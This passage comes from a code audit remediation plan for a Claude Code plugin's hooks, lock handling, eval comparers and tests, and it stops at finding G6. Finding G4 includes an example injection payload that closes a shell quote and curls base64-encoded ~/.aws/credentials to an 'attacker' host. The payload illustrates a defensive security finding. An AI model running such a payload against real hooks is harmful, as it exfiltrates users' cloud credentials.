# Code Audit Remediation Plan: EDMV3 -- prompt-streamline (Round 7)

## Context

- **Audit date**: 2026-08-10 (synthesis completed 2026-08-11)
- **Round type**: **full** (all 11 lenses ran -- `lenses-run.txt` line 1 reads `Round type: full`, lenses L1-L11 present)
- **Audited scope**: branch `edm/edmv3-prompt-streamline` @ `4022300`; `plugins/edm/**` (`bin/`, `bin/tests/`, `hooks/`, `evals/`, `skills/`, `agents/`, `docs/`, `CLAUDE.md`, `README.md`, `CHANGELOG.md`), the repository-root `.gitlab-ci.yml` and `.gitignore`, and this initiative's own `SRD/edm/EDMV3__prompt-streamline/` artifacts
- **SRD**: `SRD/edm/EDMV3__prompt-streamline/srd.md` (spec surface also `architecture.md`, `decisions.md`)
- **Ticket pack**: `SRD/edm/EDMV3__prompt-streamline/tickets/` (10 epics)
- **Deployment target**: local plugin + GitLab CI (`.gitlab-ci.yml`, scoped to `plugins/edm/**`)
- **Prior ledger state**: 48 open findings, all raised in round 6 or earlier, none previously re-verified -- round 6's 23 remediation commits landed with no audit round confirming them until now
- **This round's ledger delta**: **17 prior findings verified fixed** (`resolved_round = 7`), **31 carried open**, **44 new findings** assigned `CA-379`-`CA-422`
- **Lens artifacts**: `lens-L1.md` ... `lens-L11.md` in this directory. Zero `lens-L{N}.jsonl` files exist -- the JSONL half of every lens's output contract was elided this round (see G10/CA-388)

### Round-7 caveat that qualifies every number below

All eleven lenses were delivered without `Write` (and most without `Bash`), and **all eleven stalled at least once** before producing output -- several twice or three times. Four lenses shipped explicit truncation caveats (L3 covered ~30% of the concurrency surface; L4 skipped `wave6-smoke.sh` entirely; L6 skipped `agents/`, `README.md`, `CHANGELOG.md`; L9 ran no per-requirement `srd.md` sweep and no AC-by-AC epic sweep). **No lens could run the test suite**, so suite greenness is asserted, not observed. Treat 44 new findings as a floor, not a total. This degradation is itself filed as G10/CA-388.

## Findings Summary

### New this round (44)

| # | ID | Sev | Lens(es) | Component | Issue |
|---|----|-----|----------|-----------|-------|
| G1 | CA-379 | P1 | **L1+L11+L7** | `hooks/hooks.json:23,36,49,62,75` | Five gate PROMPT bodies still block on any non-zero `gate-check` exit; command hooks block only on 3 -- round 6 fixed one layer of two |
| G2 | CA-380 | P1 | **L7+L8** | `hooks/hooks.json:86` | The plugin's most privileged shell (~2,600 chars, runs on every commit) is the only shell no lint job reads; it also re-implements `srd_root` normalization `bin/` already owns |
| G3 | CA-383 | P1 | **L10+L2** | `bin/edm-compare-eval:4-5` | Two eval comparers, diverged exit codes and missing guards; the shipped one is untested, the tested one is unshipped, three docs assert single-source |
| G4 | CA-381 | P1 | L8 | `hooks/hooks.json:19,32,45,58,71` | `$ARGUMENTS` interpolated into a shell command string, allowlisted only *after* the sink -- prompt-injection to shell if the host substitutes textually |
| G5 | CA-382 | P1 | L5 | `bin/edm-state:4051` | `code-audit/findings-ledger.lock` family matched by no `.gitignore` pattern anywhere, never swept on archive/migrate; the test for this class hardcodes one lockbase |
| G6 | CA-384 | P1 | L11 | `bin/edm-state:1795-1796` | `jira_synced_at`/`jira_project_key` written every push, read by nothing; userConfig twin shadows them; `push-jira/SKILL.md:224` promises behavior no code keeps |
| G7 | CA-385 | P1 | L9 | `architecture.md:609` | Concurrency row cites `with_state_lock` at `:359-396` (actually `:1119`) and still says "Unchanged" about the surface round 6's `4022300` changed |
| G8 | CA-386 | P1 | L4 | `bin/tests/wave7-smoke.sh:1004-1005` | Self-satisfying assertion: haystack is the suite's own text, needle is on the assertion line -- can never fail |
| G9 | CA-387 | P1 | L4 | `bin/tests/wave7-smoke.sh:1190-1196` | "CLAUDE.md's bin/ table names all four subcommands" passes on unrelated prose; all four occur outside the table |
| G10 | CA-388 | P1 | synthesizer | `skills/code-audit/SKILL.md:248` | Audit-infrastructure regression: 11/11 lenses stalled, zero `.jsonl` written, 4 lenses truncated -- distinct from the standing CA-130 |
| G11 | CA-389 | P2 | L1 | `bin/edm-state:5049-5051` | CA-335 residual: denominator renders `3` for `fast-track`/`fix-pack` (needs `0`) because `grep -c` prints `0` *and* exits 1; whole fix untested |
| G12 | CA-390 | P2 | L1 | `bin/edm-state:5024` vs `:5146-5152` | CA-335 residual: numerator deduped, gate LIST not -- one HANDOFF renders `2 of 3` above a three-row list |
| G13 | CA-391 | P2 | L1 | `bin/edm-state:2128` | `approve-gate FOO 7` accepted; phantom gate inflates CA-335's new numerator to `2 of 1` |
| G14 | CA-392 | P2 | L1 | `wave6:1543`, `wave7:1784,2953,4289` | Four count captures bypass `count_matches`; on no match the value is `0\n0`, a bash arithmetic error instead of a named FAIL |
| G15 | CA-393 | P2 | L2 | `evals/score-artifacts.sh:419-422` | `denom -eq 0` dim-4 skip branch structurally unreachable; contradicts the deliberate hard-zero intent |
| G16 | CA-394 | P2 | L2 | `bin/tests/_harness.sh:279-289` | `unhashable` sentinel unguarded by both callers -- one missing hash utility silently greens 49 refuse-and-leave-state proofs |
| G17 | CA-395 | P2 | L2 | `bin/tests/_harness.sh:209-228` | `assert_absent_with_control` retained with zero production callers, kept alive by its own self-tests |
| G18 | CA-396 | P2 | L3 | `bin/edm-state:1202` | Flock-timeout marker created at a path neither sweep globs (both loops dead, comment names a nonexistent path); `$$` is not subshell-unique |
| G19 | CA-397 | P2 | L3 | `bin/edm-state:1205` vs `:1109` | Same lock bounded at 10s (flock) and ~5s (mkdir) by platform; CA-364 aligned the units, not the durations |
| G20 | CA-398 | P2 | L3 | `bin/edm-state:1102` | `_lock_retry_or_die` reads `tries` from the caller's scope by dynamic scoping |
| G21 | CA-399 | P2 | L5 | `bin/edm-state:5318` | `_of_errfile` has no cleanup trap on the `Stop`/`PreCompact` path that fires every turn boundary |
| G22 | CA-400 | P2 | L5 | `bin/tests/_harness.sh:390-392` | `session_dir_for_test_cwd` has no scratch-`HOME` precondition; a regression poisons real cost attribution outside any repo |
| G23 | CA-401 | P2 | L4 | `wave7-smoke.sh:1185-1189, :1911` | Unguarded terminal `grep` kills the suite under `pipefail`; count comparison has no numeric floor |
| G24 | CA-402 | P2 | L4 | `wave7-smoke.sh:2018-2019, :2742, :2798` | Repo-wide `grep -r` needles match the assertion's own source; three exclusion vocabularies for one class |
| G25 | CA-403 | P2 | L4 | `wave7-smoke.sh:1267,1277,1287,1425,963,1128` | Six positive controls written to satisfy the regex rather than reproduce the real violation |
| G26 | CA-404 | P2 | L4 | `wave7-smoke.sh:607-680, :556` | Scorer exit status discarded and stderr dropped; two crashed runs satisfy the determinism `diff -q` |
| G27 | CA-405 | P2 | L4 | `wave7-smoke.sh:2521, :1693, :1701` | Meta-assertions count lines not occurrences; `grep -ci 'defer'` is unanchored |
| G28 | CA-406 | P2 | L6 | `edm-state:4403`, `edm-check-grants:419` | Round 6's citation guard does not reach `bin/`; three live absolute line citations, accurate today, unpinned |
| G29 | CA-407 | P2 | L6 | `CLAUDE.md` schema_version section | CA-342 residual: durability sentence promises "or comments" detection a single `grep -c` total cannot deliver |
| G30 | CA-408 | P2 | L6 | `wave7-smoke.sh:213-226` | T03 block banner malformed -- its header sits under `# EDMV3-T04 end` with no opening divider |
| G31 | CA-409 | P2 | L7 | `hooks.json:19` vs `:23` | Two layers use divergent procedures for "legitimate first invocation" (`resolve-dir` in the prompt only) |
| G32 | CA-410 | P2 | L7 | `hooks.json:86` | Commit hook's prefix class is uppercase-only against nine mixed-case validators; divergence fails **open** (lint silently never runs) |
| G33 | CA-411 | P2 | L7 | `hooks.json:113-118` | Auto-spawned QC path names one `qc-summary.md` and ignores the documented shard rule the skill path honors |
| G34 | CA-412 | P2 | L7 | `hooks.json:117` | `SubagentStop` prompt uses `<PREFIX>` with no derivation step, unlike all five sibling prompts |
| G35 | CA-413 | P2 | L8 | `hooks.json:86` | CA-320 residual: relativization is lexical, so a symlinked repo path (macOS `/tmp`, `/var`) silently disables commit-time lint |
| G36 | CA-414 | P2 | L8 | `hooks.json:86` | `echo "$staged"` plus default `core.quotePath` is interpreter-dependent; an ash host splits one path into two |
| G37 | CA-415 | P2 | L8 | `bin/edm-state:1152` | fd-200 rationale names only fds 0-2, inviting a "lower it" edit into the fd-9 `BASH_XTRACEFD` and 10+ hazards |
| G38 | CA-416 | P2 | L9 | ledger entry template | Remediation waves are ledger-tracked and never AC-tracked, so nothing obliges the same-commit doc sweep (5-round recurrence) |
| G39 | CA-417 | P2 | L10 | `bin/edm-state:2227, :5048` | CA-343 residual: `skipped_phases_str` landed with two callers unconverted -- one authored by round 6's own CA-335 fix |
| G40 | CA-418 | P2 | L10 | `bin/edm-state:2502,2515,3309,3319` | Coverage row extracted, its four headers not: two mechanisms, and get-coverage's headers sit off their columns |
| G41 | CA-419 | P2 | L10 | `bin/edm-state:4620-4636` | `set-supersedes`/`set-forked-from` are a 7-line copy pair and the only two provenance setters that skip the HANDOFF refresh |
| G42 | CA-420 | P2 | L10 | `bin/edm-state:2582-2583` | CA-343 residual: `migrate-schema` routed the enumeration, kept both archived shapes, and the new comment claims otherwise |
| G43 | CA-421 | P2 | L11 | `bin/edm-state:1796` | `test_frameworks_detected` written per run, read by nothing; provenance comment inherits `coverage_by_epic`'s consumer |
| G44 | CA-422 | P2 | L11 | `wave7-smoke.sh:99` | Round 6's producer-AND-consumer rule has no consumer-side check -- `caller_contract_scan` checks producers only, and warns rather than fails |

### Carried forward, still open (31)

| ID | Sev | Lens(es) | Component | Issue | Round-7 status |
|----|-----|----------|-----------|-------|----------------|
| CA-333 | P1 | L2 | `bin/edm-state:2148` | CA-182's class at two sibling sites (phase-6 open-PARTIAL refusal; `cmd_archive` AC1e) | not re-verified (L2 scope was `score-artifacts.sh` + `_harness.sh`) |
| CA-334 | P1 | L9 | `epics/06-mermaid-rule.md:340` | Two T43 ACs broken by commit `2d83898`; code half landed, AC half not swept | not re-verified (L9 truncated) |
| CA-336 | P1 | L6 | `CHANGELOG.md:41-43` | Three siblings still assert the superseded T67 figures | not re-verified (L6 did not audit CHANGELOG.md) |
| CA-337 | P1 | L6 | `wave7-smoke.sh:5586-5590` | Comment asserting three claims all false against the current tree | not re-verified |
| CA-338 | P1 | L9 | `epics/11-cross-cutting-delivery.md:860-864` | CA-319's AC half never landed (code half verified by L8 in round 6) | not re-verified (L9 truncated) |
| CA-233 | P2 | L8 | `.gitlab-ci.yml:105-107` | `lint:bash-syntax` excludes only the `.awk` extension | partial indirect evidence of a fix -- see Notes |
| CA-311 | P2 | L4 | `bin/tests/timing.sh:90` | Wave 8's two `timing.sh` fixes have zero covering assertions | not re-verified (L4 read wave7 only) |
| CA-312 | P2 | L4 | `wave6-smoke.sh:210` | Gate-mode assertions prove presence where the contract is exclusivity | not re-verified (wave6 unaudited) |
| CA-317 | P2 | L7 | `.gitlab-ci.yml:164` | CA-227's residual at an unchecked sibling set | not re-verified (no CI sweep) |
| CA-344 | P2 | L10 | `bin/edm-init:53` | Five mechanical duplications, deliberately deferred in round 6 | **re-verified present, all five, no divergence** (L10-105) |
| CA-346 | P2 | L4 | `wave7-smoke.sh:6137-6190` | Five gate hooks have no executed happy-path case | not re-verified |
| CA-349 | P2 | L8 | `.gitlab-ci.yml:603` | The control guarding the npm pin accepts a floating specifier | not re-verified |
| CA-350 | P2 | L4 | `wave7-smoke.sh:4206` | T49 AC6's four self-verification tripwires are case-blind | indirect evidence of a fix -- see Notes |
| CA-352 | P2 | L3 | `bin/edm-state:236-243` | `state_file_for` multiple-match returns `matches[0]` in glob order | L3 explicitly declined to re-verify |
| CA-353 | P2 | L3 | `bin/edm-state:5023-5028` | `audit-converged` stderr published into HANDOFF.md | indirect evidence of a fix -- see Notes |
| CA-354 | P2 | L3 | `bin/edm-state:3812-3865` | `render-ledger` renders unlocked, then hashes under a separate lock | not re-verified |
| CA-355 | P2 | L3 | `bin/edm-state:4622-4630` | `update-patterns` reports a refusal as a clean zero-finding success | not re-verified |
| CA-359 | P2 | L2 | `bin/edm-compare-eval:133-135` | Regression path routes the operator to a settled-nonexistent fallback | not re-verified (L2 lists this file as uncovered) |
| CA-360 | P2 | L1 | `evals/score-artifacts.sh:498` | `compute_dim5` unguarded division by zero | L1 explicitly deferred (no Bash to run the scorer) |
| CA-361 | P2 | L4 | `wave7-smoke.sh:7362` | Two count captures bypass the harness count guard | not re-verified; same class recurs at four new sites (G14) |
| CA-362 | P2 | L2 | `evals/run-eval.sh:616-624` | Dead `''` case alternative preempted by `${x:-0}` | not re-verified |
| CA-363 | P2 | L7 | `hooks.json:8` | Three fire-and-forget hooks, two error-handling shapes | not re-verified as fixed (L7 re-read the file and noted the idiom split as justified for `SessionStart`/`Stop`/`PreCompact`; the `:8` diagnostic half stands) |
| CA-365 | P2 | L7 | `bin/edm-state:5186` | The only one of twelve `print_help` call sites passing `$0` | not re-verified |
| CA-366 | P2 | L6 | `wave7-smoke.sh:7364` | Pass label overstates what the G51 case proves | not re-verified |
| CA-368 | P2 | L9 | `epics/02-enforcement-kernel.md:314` | Two citation defects authored by D43 | not re-verified (L9 truncated) |
| CA-369 | P2 | L9 | `epics/03-ci-and-fixture-eval.md:264` | T21 AC5's first verify half states a singular the file contradicts | not re-verified |
| CA-370 | P2 | L9 | `epics/11-cross-cutting-delivery.md:466-467` | Second unverifiable clause in T64 AC11 | not re-verified |
| CA-371 | P2 | L9 | `epics/11-cross-cutting-delivery.md:660-674` | T66 AC3's mechanically-derived count needs its durability anchor | not re-verified |
| CA-372 | P2 | L5 | `bin/tests/fixtures/code-audit/README.md:49` | The one runtime-write instruction using a bare `/tmp` path | not re-verified (L5 covered generators, not fixture docs) |
| CA-373 | P2 | L3 | `bin/edm-state:4966` | HANDOFF Notes newline normalization is not a fixed point | not re-verified |
| CA-378 | P2 | synthesizer | `bin/edm-state:3829-3853` | `render-ledger` does not escape `|` in table cells | not re-verified; this synthesis worked around it by banning `|` from all 44 new titles |

### Verified fixed this round (17)

Each was confirmed against the tree by a lens that named it, not trusted from the ledger.

| ID | Sev | Verified by | Evidence |
|----|-----|-------------|----------|
| CA-318 | P2 | L1 + L3 | `with_state_lock:1290` now calls the shared `_git_lock_age_seconds` with three distinguishable outcomes (reclaim / age-unknown-refuse / too-young-refuse); `_edm_reclaim_stale_lockdir` is the single atomic-rename reclaim behind both paths |
| CA-320 | P1 | L8 | `check_dir="${repo_root:-.}/${srd_root}"` anchors both the existence check and the child `EDM_SRD_ROOT` at the repo root, and `diff.relative=false` forces repo-relative staged paths; committing from a subdirectory no longer fails open. Residual: G35 |
| CA-335 | P1 | L1 | Numerator dedup landed at `:5024`; the denominator derivation landed and is correct for `standard`/`prototype`/`mini-srd`. Residuals: G11, G12 |
| CA-339 | P2 | L11 | `bin/edm-state:32` and the `:3493` docstring now qualify the read-only claim ("may additively record a one-time `.degraded_checks` breadcrumb"); no prompt hook carries the `(read-only)` parenthetical |
| CA-340 | P2 | L1 | `bin/edm-init:169` re-points by name, and `wave7-smoke.sh:7794-7849` adds a shape-restricted ban on new file-and-line citations with a working positive control and a proven-non-tautological allowlist filter. Residual: G28 |
| CA-341 | P2 | L5 + L3 | The CA-169 never-unlink rationale is now documented at length at `edm-state:1160-1172` and the `.edm-state.lock` family is covered by root `.gitignore:30` plus both per-initiative generator blocks; L3 confirms the archive-vs-migrate unlink asymmetry is justified at both sites. Residual: G5 |
| CA-342 | P2 | L1 | `wave7-smoke.sh:4270-4279`'s computed assertion re-derived independently from the tree (6 call sites, 5 comment lines) and is exactly right; the `CLAUDE.md:843` needle matches. Residual: G29 |
| CA-343 | P2 | L1 + L10 | `skipped_phases_str`, `gate_is_approved`, `gate_required_and_approved` and `COVERAGE_EPIC_ROW_JQ_DEF` exist as sole definitions and all named consumers route through them. Residuals: G39 (two unconverted callers), G40 (headers), G42 (`migrate-schema` shapes) |
| CA-345 | P2 | L1 | The five command hooks now branch on `GATE_CHECK_REFUSED` (3) only, and `wave7-smoke.sh` asserts the allow-cases. **Regressed into the prompt layer** -- G1 |
| CA-347 | P2 | L1 + L3 + L5 | The timeout-marker probe is now nested inside the `_lock_ec -eq 99` branch (`:1217-1218`), so a pre-planted marker cannot misreport a successful write as a timeout; the `mkdir`-failed arm at `:1224` still names the timeout |
| CA-348 | P2 | L5 + L8 | `evals/run-eval.sh:266` now uses `mktemp -d "${TMPDIR:-/tmp}/edm-eval-scratch.XXXXXX"` with a `cleanup()` trap; L8's full sweep found no bare `mktemp` left in `bin/` + `evals/` |
| CA-351 | P2 | L5 | All eight `session_dir_for_test_cwd` call sites export a scratch `HOME` first, verified site by site. Residual: G22 (the absent precondition) |
| CA-356 | P2 | L11 | `qc_shard_threshold` deleted from `SETTABLE_KEYS` (now 10 members) and from `cmd_set`'s numeric-typing arm; `wave6-smoke.sh:2737-2740` re-keys onto `current_phase` with the reason recorded |
| CA-357 | P2 | L11 | `README.md:267` names both commands with semantics, and `CLAUDE.md`'s `supersedes`/`forked_from` rows carry the provenance-link clause matching the `set-parent` sibling. Kept rather than deleted, which makes G41 actionable |
| CA-358 | P2 | L11 | All five prompt hooks now carry step 2's invalid-prefix arm with the same `[EDM] invalid prefix` diagnostic the command hook uses, and the resolve-dir step is renumbered and re-scoped |
| CA-364 | P2 | L3 | The two state-lock `die` messages now quote the same units. Residual: G19 (the durations still differ 10s vs ~5s) |
| CA-367 | P2 | L11 | Both copies (`bin/edm-state:6` and `:120`) now read "the since-removed `lint`" |

## Detailed Findings

### G1 (P1, lenses L1 + L11 + L7): gate PROMPT hooks block on the setup-error status round 6 split off so hooks would not -- CA-379

**Problem.** Round 6's G12/CA-345 rewired the five `UserPromptExpansion` **command** hooks (`hooks.json:19,32,45,58,71`) to `edm-state gate-check "$prefix" <token>; ec=$?; if [ "$ec" -eq 3 ]; then exit 2; fi; exit 0` -- blocking on `GATE_CHECK_REFUSED` (3) and only 3. Step 4 of all five paired **prompt** bodies (`:23,36,49,62,75`) still reads "If it exits non-zero, BLOCK the expansion". `cmd_gate_check` returns 1 for every setup/usage failure. Three independently-derived reachable divergences: `require_jq` dying on a host without `jq` (the case `wave7-smoke.sh:6491-6506` asserts the command hook must **allow**), `record_degraded_check`'s write lock contending so `with_state_lock` dies with the timeout (`:6527-6558`, likewise allow), and a corrupt `.edm-state.json` failing the `mode=` assignment under `set -e`. The advisory layer therefore blocks work the deterministic layer deliberately allows, on a machine whose only problem is a missing dependency -- inverting a rule `CLAUDE.md Sec."Hooks behavior"` states in bold ("Only a real gate refusal blocks -- a setup condition never does"). Before round 6 the command hook was `gate-check ... || exit 2`, so the prompt clause was *correct*; the fix changed one of two layers. L1 filed it as L1-001, L11 as L11-004, L7 as its P2-1; L11 argues P1 (round 6's own split reached one layer only, and this one fails in the **blocking** direction, unlike round-6 L11-003's fail-safe divergence).

**Fix.** Replace step 4 in all five prompt bodies (the gate token varies per matcher) with:

> `4. Otherwise run \`edm-state gate-check <PREFIX> <token>\` (resolves the correct gate number from the initiative's mode and skipped_phases -- never hardcode one here). Exit code 3 is its dedicated gate-refusal status and is the ONLY status that blocks: BLOCK the expansion and show the user its stderr diagnostic verbatim (it already names the missing gate and the exact remediation command). Exit 0 allows expansion. ANY OTHER non-zero status is a setup or usage error (missing jq, a contended state lock, an unreadable state file) and must NOT block -- allow expansion and report the diagnostic without refusing (CA-298).`

Then extend `ca253_gate_hooks_exit2_case` (`wave7-smoke.sh:6373`) with a per-matcher `check "... prompt names exit code 3 as the sole blocking status" "Exit code 3"` and `check_absent "... prompt no longer says any non-zero blocks" "If it exits non-zero, BLOCK"`. Today the prompt bodies are asserted only for the `(read-only)` parenthetical (`:6623`), so nothing pins this clause.

**Verification.** `grep -c 'If it exits non-zero' plugins/edm/hooks/hooks.json` returns 0; `grep -c 'Exit code 3' plugins/edm/hooks/hooks.json` returns 5; `bin/tests/wave7-smoke.sh` green with the two new per-matcher assertions; manual: on a host with `jq` renamed away, `/edm:srd <PREFIX>` expands and reports rather than refusing.

**Files affected.** `plugins/edm/hooks/hooks.json`, `plugins/edm/bin/tests/wave7-smoke.sh`. Sequence G31/CA-409 in the same edit (it rewrites the same five prompt bodies).

---

### G2 (P1, lenses L7 + L8): the plugin's most privileged shell is the only shell no linter reads -- CA-380

**Problem.** The `PreToolUse` git-commit hook (`hooks.json:86`) carries ~2,600 characters of shell -- explicit-vs-default `srd_root` detection, a `./`-stripping loop, absolute-path relativization against `git rev-parse --show-toplevel`, trailing-slash/`.`-suffix trimming, `..`-traversal rejection, a staged-path `awk` prefix extractor, and a per-prefix resolve-then-lint loop with exit-code mapping. Per `CLAUDE.md Sec."CI (EDMV3-T21)"`, `lint:bash-syntax` covers `bin/*`, `bin/tests/*.sh`, `evals/*.sh` and `lint:shellcheck` the same set; **`hooks/hooks.json` is in neither glob**. So the one piece of shell that executes automatically, with no permission prompt, on every `git commit`, gets neither `bash -n` nor an unquoted-expansion check -- while `bin/tests/*.sh`, which only runs when a human types it, gets both. Lint rigor is anticorrelated with privilege, and the string is JSON-escaped, making a quoting error the hardest defect in the repo to catch by eye. L7 adds the DRY half: this is a copy-pasted variant of `srd_root` logic `bin/edm-lint-artifacts` and `bin/edm-state` already own, while every other hook in the file is a one-line delegation. This is the enabling gap behind G4/CA-381, G35/CA-413 and G36/CA-414, all of which survived six prior rounds in this one file.

**Fix.** Preferred (closes the DRY half too): extract to `bin/edm-lint-staged-artifacts` (or an `edm-state lint-staged` subcommand) and reduce the hook to its siblings' shape -- `command -v edm-lint-staged-artifacts >/dev/null 2>&1 || exit 0; edm-lint-staged-artifacts`. That brings it under both linters, makes it testable from `bin/tests/`, and lets it share one `srd_root` normalizer. Minimum (closes the lint half only): add to `lint:bash-syntax`

```sh
jq -r '.hooks | to_entries[] | .value[] | .hooks[] | select(.type=="command") | .command' \
  plugins/edm/hooks/hooks.json | while IFS= read -r c; do
    printf '%s\n' "$c" > "$tmp/hook.sh"; bash -n "$tmp/hook.sh" || exit 1
    shellcheck -s sh -i SC2086,SC2046,SC2048,SC2068 "$tmp/hook.sh" || exit 1
  done
```

Note `-s sh`, not `-s bash`: the host, not a shebang, picks the interpreter for these strings.

**Verification.** `lint:bash-syntax` and `lint:shellcheck` both report a non-zero count of hook command strings checked; a deliberately broken quote in one hook string fails the pipeline; if extracted, `bash -n plugins/edm/bin/edm-lint-staged-artifacts` plus a new `bin/tests/` case covering the subdirectory-commit and symlinked-root paths (G35).

**Files affected.** `plugins/edm/hooks/hooks.json`, `.gitlab-ci.yml`, `plugins/edm/CLAUDE.md` (CI section), and if extracted `plugins/edm/bin/edm-lint-staged-artifacts` + `plugins/edm/bin/tests/wave7-smoke.sh`.

---

### G3 (P1, lenses L10 + L2): two eval comparers, diverged, and the test suite covers the one CI does not run -- CA-383

**Problem.** `bin/edm-compare-eval:4-5` asserts "The scorer (`evals/score-artifacts.sh`) never compares; it only scores. This script owns the comparison" -- while `evals/score-artifacts.sh:663-708` (`cmd_compare`, reached via `--compare`) is a second comparer over the same two `scores.json` files. `evals/README.md:245-246` and `CLAUDE.md`'s `eval:nightly` row repeat the single-source claim twice more. Shipped divergences: `scorer_version` mismatch refuses with **exit 2** in `edm-compare-eval` and **exit 1** in the scorer; `dimensions_scored` mismatch likewise; the `complete: false` candidate guard and the `baseline.total - variance.total_range` acceptance threshold are **absent** from the scorer copy; sentinels differ (`"unset"` vs `"unknown"`/`-1`). Aggravators: the exit-code family is load-bearing (`wave7-smoke.sh:7742` pins each helper's `die` default), and the **shipped** copy's refusal logic is behaviourally untested while the **unshipped** copy's is executed at `wave7-smoke.sh:693-707` -- so the green T23 AC4 result is evidence about a code path CI never runs, and `score-artifacts.sh:659-662`'s stated rationale ("so the exact refuse-on-mismatch behaviour AC4 requires is directly testable") is self-defeating. L2 reached the same file from the dead-code direction and explicitly deferred the drift half to L10. Held at P1 not P0 because `eval:nightly` is `allow_failure: true` and `when: manual` on MRs, so a wrong verdict never blocks a merge -- the failure mode is a silently unarmed tripwire.

**Fix.** Delete `cmd_compare` and the `--compare` dispatch arm; repoint `wave7-smoke.sh:693-707` at `bin/edm-compare-eval`, which gains the executed refusal coverage it lacks (all three refusals plus the threshold). If the JSON delta output is wanted, keep `--compare` as a thin `exec` to `edm-compare-eval` with a `--json` flag so one implementation owns all three refusals, one exit-code family and the threshold. Either way correct `bin/edm-compare-eval:4-5`, `evals/README.md:245-251` and `CLAUDE.md`'s `eval:nightly` row **in the same commit** as the code change (the G3/CA-334 durability rule).

**Verification.** `grep -rn 'cmd_compare\|--compare' plugins/edm/evals/` returns only the delegating shim (or nothing); `bash plugins/edm/bin/edm-compare-eval <a.json> <b.json>` exits 2 for both mismatch classes and refuses an incomplete candidate; `wave7-smoke.sh` T23 AC4 green against the shipped comparer; `plugins/edm/bin/edm-check-vocabulary` clean after the doc edits.

**Files affected.** `plugins/edm/evals/score-artifacts.sh`, `plugins/edm/bin/edm-compare-eval`, `plugins/edm/evals/README.md`, `plugins/edm/CLAUDE.md`, `plugins/edm/bin/tests/wave7-smoke.sh`.

---

### G4 (P1, lens L8): `$ARGUMENTS` reaches a shell before the allowlist sees it -- CA-381

**Problem.** All five `UserPromptExpansion` command hooks run `prefix=$(echo "$ARGUMENTS" | awk '{print $1}')` and *then* apply `case "$prefix" in ''|*[!A-Za-z0-9_-]*) ... exit 2 ;; esac`. The allowlist is a good guard one statement too late: it validates the **output** of a pipeline that has already executed. Everything hinges on whether the host passes `$ARGUMENTS` as an environment variable (safe -- the double quotes hold) or textually substitutes it into the command string before invoking the shell (unsafe -- which is what Claude Code does for `$ARGUMENTS` in slash-command bodies, the closest documented analogue). Under textual substitution, a prompt shaped like `/edm:srd A"; curl -s https://attacker/$(cat ~/.aws/credentials|base64); "` closes the quote, runs arbitrary commands and reopens it, executing on the `echo` line where the `case` never sees it. The trigger is ordinary prompt text, so any prompt-injection vector that can get text into the user's prompt reaches a shell with the user's full privileges and **no tool-permission prompt**, because hooks are not tool calls.

**Fix.** Take the argument from the hook's stdin JSON rather than an interpolated template slot -- `prefix=$(jq -r '.prompt // ""' <<<"$HOOK_STDIN" | awk '{print $2}')`, or read the hook JSON from stdin directly. If `$ARGUMENTS` must be used, assign it without a shell-parsed line: a heredoc with a **quoted** delimiter suppresses all expansion, so injected quotes are inert. Correct under either host semantics, so this does not require settling the question first. Then record the trust level of `$ARGUMENTS` in `CLAUDE.md Sec."Hooks behavior"`, which today documents only the exit-code contract.

**Verification.** `bin/tests/` case feeding a prefix argument containing `"`, `;`, `$(...)` and a backtick, asserting the hook exits 2 with the `[EDM] invalid prefix` diagnostic and that no side-effect file was created; re-run under both `bash` and `sh` (`dash`) to cover host interpreter choice. Land behind or with G2/CA-380 so the string is linted thereafter.

**Files affected.** `plugins/edm/hooks/hooks.json`, `plugins/edm/CLAUDE.md`, `plugins/edm/bin/tests/wave7-smoke.sh`.

---

### G5 (P1, lens L5): the ledger lockbase is gitignored nowhere and swept nowhere -- CA-382

**Problem.** `with_state_lock "${init_dir}/code-audit/findings-ledger"` (`bin/edm-state:4051`) derives `findings-ledger.lock` (permanent by CA-169's flock-inode rule), `findings-ledger.lockd/`, `.lockd/pid` and `.lockd.stale.<pid>`. None of the three pattern sources covers them: root `.gitignore:15,30` require the `.edm-state.` or `docs/audit-patterns/` anchor, and both per-initiative generator blocks (`edm-state:1973-1978`, `edm-init:171-176`) list only `.edm-state.json.bak`, `.edm-state.json.tmp.*`, `.edm-state.lock*`, `*.md.tmp.*`. `render-ledger` runs on **every** code-audit round (`skills/code-audit/SKILL.md:118`, step 9a), so every Linux host -- which has `flock(1)` and therefore takes the flock branch -- accumulates one permanent untracked file per initiative, and neither destination lock sweep touches it because both derive `_dst_lockbase` from the **state** lockbase (`edm-state:2932`): an archived initiative carries `.archived/<PREFIX>/code-audit/findings-ledger.lock` untracked forever. Three near-misses explain the survival: `wave7-smoke.sh:5715-5810` is the test written for exactly this class and hardcodes a single lockbase at `:5761`; `README.md:208-227` describes "**the** advisory lock file" in the singular; and `edm-init:163-170`'s comment describes the block as covering "the lock file family" -- true of the shape, false of the coverage, because the patterns are name-anchored rather than shape-anchored. Invisible on this macOS box (no `flock(1)`, so the lockdir is trap-removed and no `.lock` is created).

**Fix (all five parts, or the gap reopens).** (1) Add shape-anchored patterns `*.lock`, `*.lockd/`, `*.lockd.stale.*` to both generator blocks -- shape-anchored, not `findings-ledger.lock*`, so a fourth lockbase is covered by construction. (2) Mirror them into `README.md:222-227` and the repo-root `.gitignore` (this repo has no per-initiative `.gitignore`, so root coverage protects the dogfooded tree). (3) Extend `_cmd_archive_move_body` and `_cmd_migrate_path_move_body` to sweep the ledger lockbase at the destination. (4) Make `wave7-smoke.sh:5791-5797` iterate **every** `with_state_lock` lockbase, derived by grepping the call sites rather than hand-listed. (5) Do **not** add a per-initiative `.gitignore` to this initiative in isolation -- fix the generators and it appears on the next `edm-init`.

**Verification.** On a Linux host (or with `flock` shimmed onto `PATH`): run `edm-state render-ledger EDMV3`, then `git status --porcelain` shows nothing; `git check-ignore -v SRD/edm/EDMV3__prompt-streamline/code-audit/findings-ledger.lock` names the new pattern; `edm-state archive <PREFIX>` leaves no `.lock` under `.archived/`; `wave7-smoke.sh` green with the computed lockbase enumeration.

**Files affected.** `plugins/edm/bin/edm-state`, `plugins/edm/bin/edm-init`, `plugins/edm/README.md`, root `.gitignore`, `plugins/edm/bin/tests/wave7-smoke.sh`.

---

### G6 (P1, lens L11): the Jira state pair is written on every push and read by nobody -- CA-384

